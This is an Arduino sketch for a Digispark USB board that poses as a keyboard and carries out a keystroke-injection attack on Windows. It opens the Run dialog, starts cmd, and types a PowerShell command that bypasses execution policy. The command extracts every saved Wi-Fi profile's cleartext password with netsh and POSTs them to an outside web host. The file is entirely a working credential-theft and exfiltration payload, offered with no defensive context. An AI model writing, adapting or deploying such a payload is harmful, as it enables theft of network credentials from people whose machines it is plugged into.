#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell -NoP -NonI -Exec Bypass \"$n=$f=@();netsh wlan show profiles | Select-String ': (.+)$' | %{$n += (echo $_.Matches.Groups[0].Value.Trim(': '))}; $n | %{$k=((netsh wlan show profile name=$_ key=clear | findstr 'Key Content') -split ': ')[1];$f+=\\\"$_ \: $k\\\"}; iwr -Uri https://t3l3machus.com/aWq8tY -Method POST -body ($f -join('<br>'))\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.print("exit");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
